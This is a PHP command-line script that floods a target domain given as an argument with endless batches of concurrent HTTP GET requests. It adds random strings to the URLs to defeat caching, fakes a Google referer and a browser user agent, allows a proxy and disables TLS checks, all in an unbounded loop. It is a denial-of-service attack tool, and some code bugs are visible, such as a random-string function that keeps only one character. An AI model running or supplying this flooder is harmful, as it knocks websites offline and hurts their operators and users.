<?php

function RandomString()
{
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $randstring = '';
    for ($i = 0; $i < 10; $i++) {
        $randstring = $characters[rand(0, strlen($characters))];
    }
    return $randstring;
}
RandomString();

$domain = null;
$quantity = null;
$args['referer'] = 'https://google.com/?q='.RandomString().RandomString().RandomString().'+'.RandomString().RandomString();

if ( isset( $argv[1] ) ) {
    $domain = $argv[1];
}

if ( isset( $argv[2] ) ) {
    $quantity = $argv[2];
}

ini_set('memory_limit', '-1');

    $headers = array();
    $headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8';
    $headers[] = 'Accept-Encoding: gzip';
    $headers[] = 'Accept-Language: en-US,en;q=0.5';
    $headers[] = 'Connection: keep-alive';
    if ( !empty( $args['referer'] ) ) {
        $headers[] = sprintf( 'Referer: %s', $args['referer'] );
    }
    $headers[] = 'Upgrade-Insecure-Requests: 1';
    $headers[] = 'User-Agent: Mozilla/5.1';
    $options = array(
        CURLOPT_CONNECTTIMEOUT  => 30,
        CURLOPT_ENCODING        => '',
        CURLOPT_FOLLOWLOCATION  => false,
        CURLOPT_HEADER          => true,
        CURLOPT_HTTPGET         => true,
        CURLOPT_HTTPHEADER      => $headers,
        CURLOPT_HTTPPROXYTUNNEL => true,
	CURLOPT_PROXY           => '',
        CURLOPT_PROXYPORT       => '',
        CURLOPT_PROXYTYPE       => 7,
        CURLOPT_PROXYUSERPWD    => '',
        CURLOPT_RETURNTRANSFER  => true,
        CURLOPT_SSL_VERIFYHOST  => false,
        CURLOPT_SSL_VERIFYPEER  => false,
        CURLOPT_TIMEOUT         => 1,
        CURLOPT_URL             => $url,
        CURLOPT_VERBOSE         => true,
    );

while(1){

    // All url saved into array
    for($i=0 ; $i<$quantity; $i++){
        $url[$i] = $domain.RandomString().RandomString().RandomString().'+'.RandomString().RandomString();
    }
	
    // Setting default option for all url and adding queue for processing
    $mh = curl_multi_init();

    foreach($url as $key => $value){
        $ch[$key] = curl_init();
        $options[CURLOPT_URL] = $value;
        curl_setopt_array( $ch[$key], $options );
        curl_multi_add_handle($mh,$ch[$key]);
    }

    // Running Query
    do {
      curl_multi_exec($mh, $running);
      curl_multi_select($mh);
    } while ($running > 0);

    // Getting data from all queries and pulling out of the queue
    foreach(array_keys($ch) as $key){
        print curl_getinfo($ch[$key], CURLINFO_EFFECTIVE_URL) . ' - ' . curl_getinfo($ch[$key], CURLINFO_HTTP_CODE) . "\x0a";
        curl_multi_remove_handle($mh, $ch[$key]);
    }

    // Finishing
    curl_multi_close($mh);

    print '[FINISHED]' . "\x0a";
    

}

?>
